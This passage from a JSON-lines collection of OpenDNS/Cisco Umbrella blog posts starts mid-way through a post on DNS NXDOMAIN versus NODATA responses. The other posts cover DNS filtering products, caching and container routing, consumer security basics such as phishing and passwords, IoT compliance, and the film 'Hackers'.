SECTION:\n;www.ipv6.awfulhak.org.INA ;; AUTHORITY SECTION:\nipv6.awfulhak.org.180INSOAns0.ipv6.Awfulhak.org. brian.Awfulhak.org. 2014051800 28800 1800 3600000 180 From the output we can see that our status code is “noerror”, and there is no answer section, this is dig’s way of showing a NODATA response. We’re getting this response because the authority server has some records for the host “www.ipv6.awfulhak.org”, just no records of type “A”. Now compare that output to running a dig for “does-not-exist.awfulhak.org”, a host which doesn’t exist (has no records in the authority at all). # dig a does-not-exist.awfulhak.org\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 59249\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0 ;; QUESTION SECTION:\n;does-not-exist.awfulhak.org.INA ;; AUTHORITY SECTION:\nawfulhak.org.1800INSOAns2.knigma.org. brian.Awfulhak.org. 2014052400 28800 1800 3600000 1800 Because the name server has no entires, of any type, for the host “does-not-exist.awfulhak.org”, we get the NXDOMAIN error code. “So why is this important to dual-stacked machines?” When working in a dual-stacked network you’ll find many types of network configurations, some hosts with IPv4 addresses only, some with IPv6 only, and some with both. Often when debugging DNS, people will run “dig <hostname>” without considering what type of DNS record matter to their hosts. By default dig sends requests for A (IPv4) records, so if the hostname you’re querying for only has IPv6 records, you won’t see an answer section or an NXDOMAIN error code (because it is actually a NODATA response). This is now your cue to query for other (most likely AAAA) records. Hopefully now you have a greater understanding of NXDOMAIN vs NODATA, and you can spot the difference when debugging DNS issues in a dual-stacked network.", "date": "2014-06-23"},
{"website": "Cisco-Umbrella", "title": "Meraki and Umbrella: together at last", "author": ["Kevin Rollinson"], "link": "https://umbrella.cisco.com/blog/meraki-umbrella-together-last", "abstract": "Batman and Robin. Peanut butter and jelly. And now, Meraki and Umbrella. All great duos, all better together. We’re excited to announce a new, simple, and powerful integration between Cisco Meraki MR access points and Cisco Umbrella. This integration is the absolute easiest and fastest way to deploy Umbrella across a wireless network. Effortlessly protect all your users and devices on your Meraki wireless networks, with just a few clicks. The integration allows networking and security administrators to conveniently enable Umbrella policies directly within the Meraki dashboard. And it enables administrators to create granular policies on a per-SSID basis or by using Meraki group policies. How does it work? Link Accounts In the Umbrella dashboard, you’ll copy your API key and Secret and input into the Meraki dashboard. The API Key and Secret are used to identify your Umbrella account within Meraki. Select Umbrella policies In the Meraki dashboard, select which Umbrella policy you’d like to apply to the SSID. For example, you could create separate Employee and Guest policies in Umbrella and enforce those policies across your Employee and Guest SSIDs, respectively. You can also use Meraki group policies, providing additional granularity. That’s it. Once you select an Umbrella policy, all users and devices on your Meraki network are protected. No changing DNS — it all happens automagically. How can I take advantage of the integration? There is no additional cost or charge for existing Meraki or Umbrella customers that want to take advantage of this integration. Meraki:  At this time, customers can access the integration by contacting Meraki support. Read the Meraki documentation. Umbrella: Visit “API Keys” located in the Admin section of the Umbrella dashboard to get started. Read the Umbrella documentation. If you’re not currently a Meraki or Umbrella customer, you can test out both products for free. There are three ways to try Meraki: you can request free trial gear, get a free access point by attending a webinar, or view an instant demo. Visit this page to get started. To try Umbrella: visit signup.umbrella.com and sign up for a free 14 day trial. No credit card or phone call required. Some technical tidbits Integration feature Why it matters Appends EDNS (Device ID and Client IP) to the DNS packet. Enables Umbrella to enforce the right policies for the right devices (Device ID) and provides visibility in the Umbrella dashboard (Client IP). Supports split DNS to exclude internal DNS requests from being sent to Umbrella resolvers Allows users to reach your network’s local resources (computers, servers, printers, etc.) on internally-hosted domains that rely on local DNS servers. Supports DNSCrypt proxy to encrypt the DNS traffic Secures DNS traffic from eavesdropping and man-in-the-middle attacks. The products behind the integration Meraki MR Cisco Umbrella", "date": "2018-08-15"},
{"website": "Cisco-Umbrella", "title": "Introducing FamilyShield Parental Controls", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/introducing-familyshield-parental-controls", "abstract": "Kids get into all sorts of things they shouldn’t get into online. And we know parents want to protect their kids from what’s out there. They want to know that what they’ve set up is effective, up-to-date and always working. Today we’re introducing a new service called FamilyShield and it’s the absolute simplest and most straightforward way for parents to protect kids from the bad stuff online. There is no complicated set up and no software to install on your computers. FamilyShield is different from — and better than — the majority of parental controls software choices parents are faced with. For starters, ours is free to use. And when set up on your wireless router, FamilyShield does more than block adult content on computers; it blocks it on Wi-Fi devices like the iPod Touch or the Nintendo DS and on video game consoles like Xbox and Wii. In addition to blocking adult content, FamilyShield also blocks proxies and anonymizers, which are how enterprising/tech-savvy kids often get around parental blocks. In addition, because FamilyShield leverages the OpenDNS content filtering system, the list of sites being blocked is constantly updated, 24/7. These updates happen automatically, without requiring any changes on the user’s end. Last but not least, because it runs on the global OpenDNS network, it will make your household Internet faster and overall more reliable. With the OpenDNS perfect 100 percent uptime record, you won’t have to tolerate annoying, intermittent Internet outages anymore. This, of course, is in stark contrast to parental controls software that is often known for slowing down your Internet experience. Why did we launch FamilyShield? For about as long as OpenDNS has been around, we’ve heard demand from you, our users, to provide a pre-configured version of the service that automatically blocks adult content. The idea has been submitted to IdeaBank, the part of our community where anyone can suggest new OpenDNS features and functionality, a few different times. We aim to give you what you want and FamilyShield is just that. How does FamilyShield work? Much like how OpenDNS Basic works, you just follow our simple two-step instructions to configure our special FamilyShield IPs on your router. Unlike OpenDNS Basic, there’s no account to configure, no complicated settings to customize, and no downloads or software to install. Even if you have a dynamic IP address. FamilyShield’s nameservers are: 208.67.222.123 208.67.220.123 What does FamilyShield Block? The service blocks pornographic content, including our “Pornography,” “Tasteless,” and “Sexuality” categories, in addition to proxies and anonymizers (which can render filtering useless). It also blocks phishing and some malware. If you’re using OpenDNS Basic today without any filtering and think FamilyShield looks just simple and straightforward enough for you, just follow the simple instructions to point to the new IPs. But, if you use OpenDNS, love OpenDNS and know of a family who could use a parental controls service that also makes their home network faster, let them know about FamilyShield .", "date": "2010-06-23"},
{"website": "Cisco-Umbrella", "title": "Caching at Scale", "author": ["Philip Thomas"], "link": "https://umbrella.cisco.com/blog/caching-scale", "abstract": "Yesterday a contingent from OpenDNS attended data-focused talks at the @Scale conference hosted by Facebook. Presentations focused on the issues that affect systems that process over 100,000 requests per second. While technologies like HDFS have provided a platform for solving most information storage and analysis problems, one pattern that emerged was the need for better tools to manage caching. History OpenDNS technology has its roots in distributed caching infrastructure – our DNS resolvers provide a read-only cache of the results of recursive lookups against authoritative DNS servers. DNS information is cached at 24 data centers worldwide. Due to the architecture of DNS, lookups come with a built-in expiry time in the form of a TTL . If there is ever a failure, anycast can provide automatic failover to other data centers. Consistency between sites is not required, but may be manually forced with our cache check utility . What interested our team from the @Scale conference was the applications of caching to dynamic data. Issues like consistency and failure detection become critical when read and write operations happen from the same client machines. Database Caches Historically, caches were used to speed up systems so that not all client requests queried the database. However, at scale databases are unable to sustain all requests, thus making caches a critical part of infrastructure. Thus, the failure of a cache or the rebuilding of a cache can cause significant downtime. When running multiple memcached servers with direct client access, the failure of one cache server can cause cascading errors and downtime. Client connections are dropped, caches need to be rebuilt, and back-end databases may be affected. One remedy is counter-intuitive: decrease the number of caching servers, because more servers increases the likelihood of a failure. In order to maintain pools of caching servers, companies have been working on different solutions to run critical caching infrastructure. Box – Tron Tamar Bercovici from Box presented about storing structured data at scale and the issue of cache failure. Their solution is called Tron, which provides a proxy to memcached servers. The tool adds features such as automatic failure detection and consistency checks. However, Tron is client-dependent, so it is unlikely to be open-sourced in the near future. Twitter – TwemProxy While Twitter did not present about caching at the conference, their TwemProxy project was referenced in multiple presentations. TwemProxy is an open-source project by Twitter for better Memcache and Redis stability at scale. It works by proxying connections to cache servers in order to consolidate and thus decrease the number of open connections per machine. Since the system was open-sourced in early 2012, it has been adopted by companies including Pinterest, Snapchat, and Tumblr. Facebook – McRouter During their presentation, Facebook announced the open sourcing of their memcache tool McRouter . McRouter takes the basic ideas of TwemProxy and builds powerful routing tools on top that allow for the managing of production pools. McRouter features include failover between cache pools, multi-cluster consistency, and cold cache warm-up. In terms of memcache tools discussed at the conference, McRouter was one of the most advanced because it handles a variety of failure and scaling scenarios. The system is currently used in production at Facebook, and it is in the process of being adopted in other high-traffic environments such as Reddit. Youtube – Vitess / Vttable After Facebook presented a comprehensive tool for managing pools of caches, Sugu Sougoumarane from Google challenged the basic idea of dedicated caching pools. The basic idea of caches is to reduce database load and latency. Rather than separate caches and databases, Sugu embarked on a project to build caches into database systems. Vitess is a open-source system written in Go that is about to enter full production at Youtube. One of the most fascinating components is a MySQL wrapper called Vttablet. Vttablet improves MySQL performance by modifying SQL, pooling connections, and consolidating queries. Vttablet supplements the MySQL buffer cache with RowCache, a memcache store of row information. Because the cache is also managed by Vttablet, there are no expiration keys – Vttablet invalidates caches when it parses SQL queries that change cached values, thus eliminating consistency issues. Vitess challenges the paradigm of treating caching as a separate layer by directly addressing the issues of database scalability and by modifying the handling of SQL queries. Conclusion When a cache grows from a single server to a pool, management and consistency become concerns. As request volumes grow, cache failures can take down a system. Because of this, the management of cache pools is becoming a critical component of data systems at scale. Videos from @Scale 2014 are available on Youtube.", "date": "2014-09-16"},
{"website": "Cisco-Umbrella", "title": "IP Routing, AWS, and Docker", "author": ["Rahim Lalani"], "link": "https://umbrella.cisco.com/blog/ip-routing-aws-docker", "abstract": "Operating distributed computing systems at scale brings a variety of challenges. Minor issues like having the wrong version of a small software library can take a whole application offline. To create a smooth transition from development to operations with regard to dependencies, environment, and testing OpenDNS has adopted open-source Docker containerization technology. Interfacing Docker containers with existing dedicated infrastructure across 23 data centers provided a unique set of routing challenges which we solved with clever application of Generic Routing Encapsulation and Border Gateway Protocol. Containers Containerization brings operating system-level virtualization. Compared to tools like VMware, this direct access to the system kernel brings improved speed. Docker specifically brings Git-levels of simplicity to managing system images. In short, packaging applications in Docker takes the guess work out of deployments by replicating the exact same environment between development and production. Impetus at OpenDNS Containerization at OpenDNS started as a hackathon project in August 2013 when a team built a small platform system to demonstrate its benefits. Since then, an OpenDNS Engineering Infrastructure team has built a comprehensive platform as a service (PaaS) based on Docker. By abstracting away the underlying infrastructure, engineering can focus on development rather than dependency management and monitoring. The PaaS itself implements service methodologies from the Twelve-factor app . The OpenDNS Global Network includes 23 data centers plus significant cloud infrastructure in Amazon Web Services (AWS). Routing network traffic between these hardware and cloud infrastructures poses a challenge, and the OpenDNS PaaS project began as a way to replicate the performance of dedicated hardware systems in cloud networks like AWS. Described below is an experiment in routing around one of those limitations. The Problem OpenDNS sought to be able to run hundreds of containers, each potentially having a privately-routable IP address, on a single EC2 host. The problem is that an EC2 instance can have a limited number of secondary IP addresses . Two Quick Definitions Generic Routing Encapsulation (GRE) is used to encapsulate a protocol and route it over IP. In our solution we encapsulate an IP packet inside of another IP packet. This allows us to build tunnels through third party networks. Border Gateway Protocol (BGP) is a routing protocol used to announce reachability of IP networks. This protocol is most frequently used between ISPs. Below we’ll be using it between one of our routers and EC2 instances. A Solution Our solution was to use GRE to create an overlay network spanning OpenDNS’s network and our AWS Virtual Private Cloud (VPC) to get around routing limitations in EC2. The first approach was to allocate and statically route /24 prefixes (allocated from a larger block, e.g. 10.0.0.0/16) to individual docker hosts running in EC2. This would give us sufficient IP addresses to support 250 containers with unique IPs per host. Extending this concept, we used BGP sessions between each docker host and our router. Each host announces its own address space. This allowed us to go from a single large prefix to individual /32s with minimal configuration on the router. Using Quagga as a BGP daemon on our docker hosts allowed us to redistribute /32s from the hosts’ routing table into BGP. Tools like Pipework could be used here to wire up container IPs and the routing table with Quagga automatically announcing these via BGP. Powerful Moving a container from one host to another host becomes straightforward in this scenario. Replicate the container on a new host and assign it the prior IP address, then afterward destroy the old container. The BGP routes converge within a couple of seconds to re-route traffic. What happens if you don’t take the old container down and there are two containers with the same IP address? Load balancing! Most routers can be configured for Equal-Cost Multi-Path (ECMP) routing to accomplish this. This leads to powerful options such as creating fault tolerant active-active load balancing across multiple hosts, as well as using anycast across our hybrid environment which we discussed in a previous blog post . Next Steps Utilizing Docker has made operating distributed computing systems between dedicated and cloud data centers transparent. As our internal PaaS tools evolve, we continue to automate more tasks. For instance, we configure the GRE tunnels and BGP peers on each docker host and router manually. This is not scalable and we need to look at how to automate this. We used BGP as our dynamic routing protocol but we could explore OSPF as an alternative. We have been using private IP address space in our tests but we would also like to experiment with using public IP addresses in the same way. Lastly, we are excited to start using IPv6 addresses in our containers on EC2 and truly remove any address limitations. We’d love to hear from you if you’re using a similar method or have alternate solutions!", "date": "2014-07-01"},
{"website": "Cisco-Umbrella", "title": "All the Phish in the Sea", "author": ["Patrick Colford"], "link": "https://umbrella.cisco.com/blog/phish-sea", "abstract": "Every week, we hear of new threats to computer security: Cryptolocker, Heartbleed, Zeus. With so many different names and kinds of threats, it can be daunting to keep track of all the different ways that a computer can be compromised. OpenDNS and our Umbrella Roaming Client are powerful security tools, but the best weapon in the fight against cybercrime is battlefield knowledge. Some might call the comparison of malicious activity to warfare a little hyperbolic. Not long ago, bugs and viruses were the realm of bucktoothed hackers looking to annoy people or companies, but weren’t treated as anything other than irritating teenagers with an internet connection, a computer, and some time to kill. But times have changed, and malicious activity on the net isn’t a joke anymore, but a business. According to McAfee, malicious activity annually costs the world about $375 billion, at a conservative estimate . The FBI tells us that 18 computers get infected every second . OpenDNS’ security solutions help prevent malware and phishing attacks from affecting your computers, but knowing about the different threats is key. Malware refers to any piece of malicious software , programs that are designed to impede or disrupt a computer’s standard operations. Previously, this was used mainly to refer to viruses, but as malware becomes more of an industry than a hobby, we see new variants emerging—including keyloggers, ransomware, and RATs. These threats vary in terms of what they do and the kind of damage they inflict, so I’ll go over them one by one. Keyloggers are programs that run invisibly on your computer in the background. While running, keyloggers record all of your computer’s keystrokes and send them to the attacker. Though the attacker may get your benign search terms (I’ve searched for “cats” more times than I’d care to admit), they’ll also get your passwords and email addresses if you type them in. Because the keylogger is on your computer, those keystrokes are unencrypted and totally exposed to the program. Keyloggers can just as easily record your PIN or credit card information when using online shopping services or banking. Whereas keyloggers hide in the background, ransomware is anything but subtle. These programs take your computer files such as the photos from your last vacation, tax records for your business, or your favorite songs from this really rare album you have, and encrypts them, making them unable to be opened by you until a fee (the “ransom”) is paid. Some even offer technical support in helping you pay them. One famous example of this software is Cryptolocker, which earned its operators $30 million in 100 days . Rounding out the list, RATs are what a lot of people think of when they imagine cybercrime. An acronym standing for Remote Access Trojan , these programs give root access of a computer to the attacker, letting them remotely control all of the computer’s functions. They can move your cursor, see what windows you’re currently looking at, and much, much more. Having full access to your computer means they can do anything and everything they want with it. Whereas malware is designed more to take advantage of your computer and its weaknesses, phishing attacks are designed to take advantage of you . A play on fishing , this sort of malicious behavior is meant to trick you into revealing sensitive or valuable information, such as your passwords, bank account number, SSN, or any other information you want to keep secret. One of the major differences between phishing and malware is that very few phishing attacks require you to download anything. Nigerian Scamming Emails, alternatively called “419 attacks” (from the Nigerian Criminal Code about fraud ) or “Nigerian Prince Emails” are famous examples of phishing attacks. In these emails, the senders claim that they have a large amount of money held in trust because a wealthy relative died, and that they need a little bit more money to gain access to the larger sum. Perhaps they can’t afford the trip to the bank in the capital to claim it, or they may need to pay a “service fee” to the bank. However, this bank, and the larger sum, don’t actually exist. It doesn’t stop people from believing that if they wire some money to the sender, they’ll receive a payout at the end. Similarly, there are many messages purporting to be from banks or email services like Google. In it, the sender warns that the victim’s account is in jeopardy. Maybe the account is about to be deleted, or that it has been compromised. In any case, the sender has to “authenticate” that the victim is legitimate, and so requests the victim’s account information, including any passwords and mailing addresses. Email phishing attacks are very common because it’s email is cheap, fast, and easily spoofable; it’s trivial to claim a sending email address as “accounts@bankofamerica.com” or “customerservice@google.com” but receive the message elsewhere. To learn more about phishing check out this talk “ Teach a man to phish ” from fellow OpenDNSer Vinny Lariza, who recently presented at BsidesLV. Learning about the different threats on the web is the best weapon in any person’s arsenal, but knowledge alone isn’t enough. Even the most careful people on the web still fall prey to attacks, which is why OpenDNS is here to help defend computers and their users.", "date": "2014-08-21"},
{"website": "Cisco-Umbrella", "title": "How IoT Devices Make Security Compliance Even More Complex", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/how-iot-device-makers-leave-compliance-risk-to-enterprises", "abstract": "As a budding industry, the Internet of Things could create a number of direct security risks for enterprises, but compliance is also an issue that needs addressing. Companies that deploy IoT devices for their own use, or those that have employees bringing them into the office, will find a dearth in documented answers from manufacturers about data collection methods. And the controls needed to keep company and customer data safe can be sparse for some devices . As a compliance issue, the lack of control over the security of IoT devices and the data they collect can come with weighty consequences. According to Jennifer Tharp, a security compliance analyst at OpenDNS, the world of compliance can be a labyrinthine of rules and guidelines, and regulations vary widely depending on the country. For companies looking to break out of a domestic market, it can be difficult to know all the regulations involved, and not knowing can have some pretty weighty consequences. Given that most Internet of Things devices do not disclose where they send collected data, let alone what data is collected in the first place, IoT is also bound to make compliance management even more difficult. In January 2015 the FTC released an Internet of Things report that lists suggestions for companies both creating and using devices. In it, the FTC lays out 55-pages worth of introductory definitions of IoT, regulatory suggestions, and best practices for security. The problem is, most device manufacturers are not following the suggestions made in the report. And some of the report’s suggested safety measures are currently not possible, such as auditing data collection and privacy. “[Compliance] is complicated,” Tharp said, referring to the compliance rules of some countries that forbid collected personal data to be transported outside the country. IoT devices, as noted in OpenDNS’s Internet of Things in the Enterprise report , send collected data to any number of countries, often without end users’ consent or knowledge. “The purpose of any compliance framework is to prove you are trustable,” Tharp said. “These [laws and regulations] are coming up at a time when we are more connected than ever.” Proving that a company has a handle on all consumer data and where it goes can be incredibly difficult, especially if IoT devices are present. The FTC report focuses a good amount on proposed disclosure and consent measures for consumers using devices. Mainly, the commission would like manufacturers to allow device users the ability to opt out of unnecessary collection, and a disclosure of what data is being collected and where it goes. According to the OpenDNS Research team, documentation for data collection and handling largely does not exist, which is troubling for both consumers using the devices and companies trying to secure them. “When we first started to look at the popular IoT devices that people use, we found the actual documentation to be really sparse,” said OpenDNS Director of Research Andrew Hay. “They didn’t tell you what networks or domains to allow and there was often no information about networking at all beyond ‘make sure this device can talk to the Internet using HTTP or HTTPS.’ This goes against what security people have been taught, in terms of locking down communications for any device on the network.” As for compliance consequences, Tharp says they can vary widely. Germany, for example, has some pretty extreme fines for misuse of consumer data. Data protection violations can bring fines as high as 300,000 euros . “Some companies also say they won’t do business with a company that’s not compliant,” Tharp said. “But companies often say one thing and do another.” As for IoT makers, the FTC’s report also suggests building security into the product instead making it an afterthought. FTC Commissioner Julie Brill says this development philosophy should be fundamental as what she terms the “three V’s”–variety, velocity, and volume–of data collection begins to reach ever higher levels. She mentioned in an interview with NextGov.org that a developing focus for the FTC has been to get companies to consider “privacy by design.” “That is, let’s not place so much of a burden on consumers,” she said. “Let’s have companies really think through the data practices that they have. Do they really need to collect all of that data? And if they do, how can they protect it or ensure that a consumer’s privacy is appropriately handled?”", "date": "2015-07-17"},
{"website": "Cisco-Umbrella", "title": "Password Security Is as Easy as 1234567", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/password-security-easy-1234567", "abstract": "Open Sesame! Passwords have existed in one form or another since ancient times. Once used to keep evildoers out of encampments, they now protect our data and identities from modern-day criminals. Apps, online accounts, ATMs, and really cool secret restaurants all require passwords, and with good reason. With data breaches continuously making headlines, creating a secure password and keeping it safe should be top-of-mind for everyone. In this post, we’ll share tips from IT professionals about how to manage your passwords. Gandalf had the right idea. The More You Know – Tips from the Pros OpenDNS customers are in the trenches everyday, keeping their users safe from online threats, and possibly the occasional PEBCAK . We asked them for their best suggestions for keeping users secure – and password education topped the list: “Write down passwords (or use a password manager). I would rather my users write down a secure password than memorize an insecure one they use in multiple places.” Jerry Gamblin, Security Specialist When you get down to it, humans simply cannot remember truly secure passwords. No matter how good your memory is, a string like ~0Dn5.1$4w3S0m3! is too complex – especially when you consider how many passwords you type in on a daily basis. The value of a password is based on how difficult it is to crack, not how easy it is to remember. “Use a different password for each site.” Janet Kowal, Head of Computer Services/Reference Librarian Herein lies the true value of a password manager. When you type in several passwords on a daily basis, the fact is, each one of those passwords should be unique. Why? If an attacker gains access to your password anywhere, they now have access to every other account you own. Don’t make it easy for criminals to access your information. “Use 1Password! Randomly generated passwords across hundreds of sites!” Phil Havens, SysAdmin If physically writing passwords isn’t your thing, a password manager can do the work for you. 1Password, Dashlane, and LastPass are all examples of password managers, which you can use to create and store secure passwords, so that “forgot your password?” will be a thing of the past. “Set up a Windows password. Most home users and many small businesses do not use passwords. The computer just boots up into a default account with no password on it that has full administrator privileges.” Matthew Wilson, Technology Consultant When thinking about security, many people focus only on what happens online or in apps – they overlook securing a machine or smartphone with a lock password. None of the password safeguards matter if an attacker gains access to your physical device. “Passwords are like toothbrushes – don’t share them!” Andrew Hay, Senior Security Research Lead and Evangelist There is no reason to share your passwords with anyone, no matter who they are, or why they’re asking. Always enter your passwords yourself. “Loose lips sink ships,” as they say. So what makes a password secure? It’s more than just adding a capital letter and some numbers.  Here’s a few examples to avoid, collected by SplashData : You know better than that, right? The strongest passwords are lengthy, impersonal, and make use of various characters. Here are a few basic tips: Don’t use dictionary words. Don’t use personal information that attackers could easily access or guess, for example, a telephone number or family name. Don’t be afraid to go long – the longer your password, the better. Don’t be afraid to use various characters. Make it weird – and in doing so – harder to crack. Conclusion You’ve read this blog – what’s next? Hopefully, you have set up a password manager, and you have unique, complex passwords for each site you visit. While you shouldn’t share your passwords, you should share this information with everyone you know. Passwords are universal – good password practice isn’t.", "date": "2014-05-09"},
{"website": "Cisco-Umbrella", "title": "“I have a next generation firewall (NGFW)—why do I still need OpenDNS?”", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/next-generation-firewall-ngfw-still-need-opendns", "abstract": "This question is one we get all the time both from prospects in the beginning stages of investigating cloud-delivered network security services as well as customers we have worked with for years. We never claim to be a “catch all” product. In fact, vendors who imply that their products or services are all you need to protect your network at the very least are wildly misinformed. Our goal is to create products that provide an Internet-wide foundation for your security stack. A foundation, that, when layered with other critical security controls, prevents attacks and malicious activity to your devices, no matter where they’re located. To start, let’s be clear about the difference between firewalls and OpenDNS’s products. Firewall defenses react after an attack already has been launched. You may be thinking, “OK, even if my network is attacked, the firewall will stop it. So why the need to be proactive?” In today’s world, this line of thinking is downright risky because the velocity and volume of new attack tools and techniques enable some malicious activity to go undetected for minutes or even months. While we can stop malicious Internet connections before they occur (at the DNS layer), a firewall must scan each of these connections. NGFWs do not offer protection to off-network devices without always keeping a VPN on, which adds latency. When it comes to protecting your end users working outside of your perimeter , OpenDNS is much faster, safer, and more effective. In a recent InfoWorld article, J. Peter Bruzzese commented, “Signature-based products like firewall and endpoint defenses are critical to blocking or containing phishing attacks. But you might be missing a crucial element at a different layer of your security defenses: OpenDNS. The next layer to your security solution should be focused at the DNS level.” Read the full article here to better understand why now more than ever people are integrating solutions at the DNS level into their security stack. Using a layered approach to security is critical as network perimeters continue to erode and  confidential information is accessed through cloud services on public WiFi networks. The best way to maintain a strong security posture is by integrating OpenDNS with an NGFW. Our service does not include an intrusion prevention system, so if you’ve deployed only OpenDNS, then your system could be vulnerable to malformed packets or DoS (denial of service) attacks. We recommend combining OpenDNS with a NGFW as critical elements in your layered security solution, as opposed to simply adopting one or the other. What do some of the industry’s leading professionals say about a layered approach to security? In order to ensure robust protection for his company, an industry expert and OpenDNS customer working for a large legal firm recognized the necessity of the detection capabilities offered by the combination of a NGFW and OpenDNS. He said, “Our philosophy on all of our security controls is to diversify the technologies because we figure everyone does a pretty good job of security but no one does it perfectly, and by layering a diverse stack together, we benefit from the detection capabilities of each. OpenDNS was something we could put on our laptops with the roaming client so that we still have that layer of protection outside of our perimeter.” In short, don’t get rid of your firewall. Additionally, don’t think that your firewall is enough to secure your network. Attackers unfortunately are just as innovative as we are, so it’s imperative to cover your bases and understand that one product, feature, or service will never be infallible on its own. You can read about the difference between OpenDNS and NGFW, as well as the importance of having both, in this solution brief .", "date": "2015-01-22"},
{"website": "Cisco-Umbrella", "title": "Draw me a DNS", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/draw-me-a-dns", "abstract": "DNS, or Domain Name Service for the layperson, is a very integral part of the internet. Without DNS, the internet would be on “hard-mode” all the time. It would be like the days before speed-dial when you had to actually REMEMBER everyone’s phone number like some sort of Einstein-esque genius. Have you ever lost your phone before and tried to call someone? It’s hard. I seriously should have gotten a Nobel Prize for knowing all of my best friends’ phone numbers by heart back in the day, but I digress. What DNS essentially does is map domain names to IP addresses, as the IP’s are what’s actually used to connect you to the website itself. URL’s are basically just shortcuts that are designed to make it easier to surf the internet. But how does that work? Well it’s magic. Plain and simple (don’t worry, I promise this answer will hold up in any job interview but only if you smug up your face while you say it). All joking aside, it is pretty magical but it’s not supernatural by any means. Check it out. Let’s start with your computer, represented by this little guy right here. For example purposes, lets say you wanted to visit Facebook. You’d open up a browser and type “facebook.com “ into the url field. This is where the magic happens. Your computer then sends a request to the local DNS server. The DNS server acts sort of like a phone directory. It receives your “facebook.com” request, retrieves the IP address for that domain, and then sends it right back to your computer. Now that your computer has the IP, it knows the way to San Jose (shouts out to Dionne Warwick ). It takes that IP and uses it to connect you to “facebook.com” where you are free to view advertisements, post pictures of just your face that you took yourself, “like” pictures of other people’s faces that they took themselves, etc. There are other variables and whatnots that can complicate this “connecting to a website” process depending on the situation, but if we were to boil it all down simply, this is about what it would look like. I know I’m not the greatest artist, but that’s beside the point. Looking at it from an overhead view like this really outlines the importance of having DNS security implemented on your network. If that DNS server in the diagram were OpenDNS, then you could see how we would be positioned in such a way that could potentially keep your computer from ever coming in contact with infected domains! Or, even better yet, if you didn’t want people visiting “facebook.com” on your network, you could use OpenDNS to prohibit that from happening too! So there you have it. I hope you’ve enjoyed this crash course on DNS. So the next time someone asks you if you know where DNS lies in the landscape of internet protocol, you should have no problem drawing them a picture.", "date": "2015-02-26"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Updater offers dynamic IP update for Macs", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/mac-dynamic-ip-updater", "abstract": "OpenDNS user Zach Weigand just released version 1.0 of his freeware AppleScript application for keeping OpenDNS updated as dynamic IP addresses change. We’d seen the work brewing, and it’s fun to share his work with a wider audience. I know many OpenDNS users on Macs can benefit from this focused utility. Go to MacUpdate.com to download the application (all of 25K) and the brief documentation. (Looks like a few hundred downloads at each place already!) This application will be useful after you do three things ( besides, of course, using OpenDNS ): Create a free account . Add a single IP network from the Networks tab of the OpenDNS Dashboard. Check the box to enable dynamic IP updates for that network from the Settings tab. (Look for “Set Up a Dynamic IP” in the left-hand menu.) Multiple dynamic IP addresses per account are supported; read more tips and information about dynamic IPs, or get clients for other platforms. Developers, we’re happy to add your app to the list. Thanks, Zach!", "date": "2007-09-07"},
{"website": "Cisco-Umbrella", "title": "Hack the Planet: “Hackers” Turns 20", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/hack-the-planet-hackers-turns-20", "abstract": "Hollywood often looks to the fringes of society for inspiration, creating fantasy worlds based on the reality of a select few. Almost no genre of movie represents this better than the hacker flick: from “War Games” to “The Matrix” — and even “Jurassic Park ” — technology and the seemingly supernatural powers of those who control it are a popular fixture in TV and film. To the uninitiated viewer, the hacker world can be a fast-paced exotic universe, fraught with dangerous locales and mysterious connections, shadowy government agencies and back-alley clubs. With an explosion of new technology available in the 80s and 90s, a new genre, cyberpunk, arose to house these characters and lifestyle. According to Lawrence Person, a science fiction author and editor, “cyberpunk” focused on “characters [who] were marginalized, alienated loners who lived on the edge of society in generally dystopic futures where daily life was impacted by rapid technological change, an ubiquitous datasphere of computerized information, and invasive modification of the human body.” The movies that have endured as fan favorites and cult classics took hacker culture and distilled it for mass consumption, adding a dash of good looking celebrity and enough technical fudging to keep the story light. One such film at the vanguard of these mainstream hacker epics was “ Hackers ,” and this week it turns 20 years old. The film stars Angelina Jolie in one of her first roles and Johnny Lee Miller as a hacking whiz kid, who crashed 1,507 systems at the tender age of 11. The action of Hackers centers on a convoluted plotline involving the malicious machinations of the Ellingson Mineral Company security officer who goes by “The Plague.” The surprisingly prescient nod to the dangers of ICS/SCADA systems lend a modern dose of reality to an otherwise downright silly movie. Although the subliminal cut scenes and overwrought “dives” into the inner workings of the machines and operating systems are pure ’90s sensationalism, “Hackers” inspired a generation — the generation that is now hitting the workforce — to learn more about the budding Internet and the technology that runs it, and to dream about breaking computers and phreaking phones. In a post celebrating the movie’s 20th anniversary, writer Simon Chetrit said, “Despite being wildly inaccurate, the film was hugely inspiring to many members of Hack Manhattan for creating a certain mystique around hacking culture that other tech films never quite matched.” One of the Hack Manhattan crew added, “When I first saw this movie, I was inspired to learn about computer hacking. I actually learned Assembly because of this movie.” To mark the 20-year milestone of “Hackers” and its contribution and inspiration to hacker culture, we used an app called Dubsmash and put together a short clip of our own hackers here at OpenDNS reenacting their favorite lines from the movie. Enjoy, and feel free to post your own by searching the hashtag #Hackers in the Dubsmash app, and share them on Twitter using the hashtag #HackersDub. &amp;amp;amp;lt;br>&amp;amp;amp;lt;em>How has this movie, or other classic Hacker films such as “Sneakers,” “War Games,” or “Takedown,” shaped your view on the security industry? Let us know in the comments below!&amp;amp;amp;lt;/em>", "date": "2015-09-15"},
